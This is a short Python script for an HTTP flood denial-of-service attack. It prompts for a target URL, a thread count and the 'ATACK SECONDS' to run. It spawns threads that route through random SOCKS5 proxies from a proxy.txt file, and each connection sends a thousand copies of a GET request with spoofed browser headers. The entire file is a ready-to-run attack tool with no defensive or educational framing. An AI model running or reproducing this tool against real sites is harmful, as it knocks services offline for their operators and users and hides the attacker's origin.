from socket import (IPPROTO_TCP,TCP_NODELAY)
import socks
import ssl
import random
import threading
from urllib.parse import urlparse
import time


def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def method(url,timer):
    start_time = time.time()
    end_time = time.time()
    while (end_time - start_time) < timer:
        try:
            end_time = time.time()
            target =  get_target(url)

            req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
            req += 'Host: ' + target['host'] + '\r\n'
            req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
            req += 'Accept-Encoding: gzip, deflate, br\r\n'
            req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
            req += 'Cache-Control: max-age=0\r\n'
            req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
            req += 'sec-ch-ua-mobile: ?0\r\n'
            req += 'sec-ch-ua-platform: "Windows"\r\n'
            req += 'sec-fetch-dest: empty\r\n'
            req += 'sec-fetch-mode: cors\r\n'
            req += 'sec-fetch-site: same-origin\r\n'
            req += 'Connection: Keep-Alive\r\n'
            req += 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 ' + '\r\n\r\n\r\n'

            if target['scheme'] == 'https':
                packet = socks.socksocket()
                proxies = open('proxy.txt').readlines()
                proxy = random.choice(proxies)
                packet.set_proxy(socks.SOCKS5, proxy.split(':')[0], int(proxy.split(':')[1]))
                packet.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                packet.connect((str(target['host']), int(target['port'])))
                ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                packet = ssl_context.wrap_socket(packet, server_hostname=target['host'])
            else:
                proxies = open('proxy.txt').readlines()
                proxy = random.choice(proxies)
                packet = socks.socksocket()
                packet.set_proxy(socks.SOCKS5, proxy.split(':')[0], int(proxy.split(':')[1]))
                packet.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                packet.connect((str(target['host']), int(target['port'])))

            for _ in range(1000):
                packet.send(str.encode(req))

            packet.close()
        except:
            pass

target = input('Target: ')
threadsnum = int(input('THREADS: '))
timer = int(input('ATACK SECONDS: '))
for z in range(threadsnum):
    threading.Thread(target=method,args=(target,timer,)).start()